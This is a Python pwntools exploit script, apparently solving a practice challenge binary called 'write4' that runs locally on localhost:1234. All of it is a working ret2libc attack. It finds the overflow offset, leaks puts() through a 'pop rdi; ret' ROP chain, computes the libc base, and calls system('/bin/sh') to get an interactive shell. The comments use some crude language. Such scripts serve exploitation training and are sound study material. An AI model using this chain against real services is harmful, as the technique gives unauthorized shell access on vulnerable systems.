from pwn import *

#socat TCP4-LISTEN:1234,reuseaddr,fork EXEC:./write4 in order to run locally the binary

context.clear(arch="amd64")
LOCATION = "./write4"
LIBC_LOC = "/lib/x86_64-linux-gnu/libc.so.6" #used libc found with ldd ./binary
REMOTE   = remote("localhost", 1234)         #binary listening on the machine

binary = ELF(LOCATION)
libc   = ELF(LIBC_LOC)
rop    = ROP(LOCATION)

putsFunc = binary.symbols["puts"]                #extract address of puts() from the binary
mainFunc = binary.symbols["main"]                #extract address of main() from the binary
putsGot  = binary.got["puts"]                    #extract address of puts() in the GOT
popRet = rop.find_gadget(["pop rdi", "ret"])[0]  #"pop rdi; ret" gadget needed to leak address and craft exploit
log.info("\"pop rdi; ret\" at {0}".format(hex(popRet)))

def pcOffset(): 
    proc = process(LOCATION, timeout=2)
    proc.sendline(cyclic(1024, n=8))
    proc.recvall()  
    core = Core("core")
    pcOff = cyclic_find(core.pc, n=8)
    return pcOff

def leakAddr(address, offset):
    payload  = 'A' * offset     #overflow buffer
    payload += p64(popRet)      #pop rdi; ret gadget
    payload += p64(address)     #address to put in rdi
    payload += p64(putsFunc)    #call puts function
    payload += p64(mainFunc)    #return to main so that binary doesn't die
    REMOTE.recvuntil('>')
    REMOTE.sendline(payload)
    REMOTE.recv()
    value = u64(str(REMOTE.recv(6) + "\x00\x00")) #black wizardry to pack return address is done here:
    # even though architecture is 64bit the real addresses with ASLR enabled use up to th 47th bit, hence
    # we get 6 bytes back by puts(). We append 2 null bytes at the end (little endianness, bitch) to form a
    # 8 byte address that gets passed to u64()
    return value

def exploit(systemFunc, command, offset):
    payload  = 'A' * offset     #overflow buffer
    payload += p64(popRet)      #pop rdi; ret
    payload += p64(command)     #"/bin/sh" address
    payload += p64(systemFunc)  #system address
    REMOTE.recvuntil('>')
    REMOTE.sendline(payload)
    log.info("Running exploit, you should get a shell now...")
    REMOTE.interactive()

def getSystem(offset):
    putsLeak = leakAddr(putsGot, offset) #leak remote address of puts()
    log.success("Leaked puts() at {0}".format(hex(putsLeak)))

    putsLibc = libc.symbols["puts"]     #extract puts() offset from libc
    libcBaseAddr = putsLeak - putsLibc  #find libc base address by subtracting puts() offset from puts() address
    log.success("Base address of libc at {0}".format(hex(libcBaseAddr)))

    systemFunc = libc.symbols["system"] + libcBaseAddr #find system() address by adding its offset to libc base address
    log.success("Remote address of system() should be {0}".format(hex(systemFunc)))
    
    binshAddr = next(libc.search("/bin/sh\x00")) + libcBaseAddr #find "/bin/sh" string in libc
    log.success("Address of \"/bin/sh\" string is {0}".format(hex(binshAddr)))
    
    return systemFunc,binshAddr


offset = pcOffset()
log.info("RIP offset at {0}".format(offset))

system,binsh = getSystem(offset) #call getSystem() to get the address of "/bin/sh" and systemm()
exploit(system, binsh, offset)



